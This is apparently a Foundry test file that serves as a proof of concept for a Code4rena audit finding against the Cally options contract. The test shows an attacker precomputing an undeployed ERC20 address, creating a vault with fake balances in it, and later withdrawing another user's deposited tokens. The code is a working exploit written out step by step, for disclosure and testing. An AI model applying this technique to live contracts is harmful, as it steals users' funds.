/*

Fake balances can be created for not-yet-existing ERC20 tokens, 
which allows attackers to set traps to steal funds from future users

https://github.com/code-423n4/2022-05-cally-findings/issues/225

*/

pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "../shared/Fixture.t.sol";

import "src/Cally.sol";


contract t3 is Test, Fixture {


function testFakeBalance() public {

    //add used for erc20 deployment. 
    address a = 0xf55037738604FDDFC4043D12F25124E94D7D1780;

    // add for the deployed contract
    address deployemntadd = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), a, bytes1(0x80))))));

    require(deployemntadd.code.length == 0, "not a contract yet");

    vm.startPrank(babe);

    // vault created with undeployed erc20
    uint256 vaultId = c.createVault(100, deployemntadd, 1, 1, 1, 0,Cally.TokenType.ERC20);

    //keep vault from being bought
    c.initiateWithdraw(vaultId);

    vm.stopPrank();

    uint256 time = block.timestamp;

    //pass some time to expire option 

    vm.warp(time + 25 hours);

    vm.prank(a);

    //erc20 now deployed 
    address deployed = address(new MockERC20("Mock","Mock",18));

    //same address
    require(deployed == deployemntadd);

    MockERC20 mock = MockERC20(deployed);
    
    vm.startPrank(bob);

    //give some tokens to bob
    mock.mint(bob,100);

    // approve spending for contract 
    mock.approve(address(c), 100);

    //bob creates a vault with new token
   uint256 vaultId2 = c.createVault(100, deployed, 1, 1, 1, 0,Cally.TokenType.ERC20);

    vm.stopPrank();

    require(mock.balanceOf(address(babe)) == 0);

    vm.prank(babe);

    c.withdraw(vaultId);

    //babe has just stolen 100 tokens from bob

    require(mock.balanceOf(address(babe)) == 100);

    



















}








}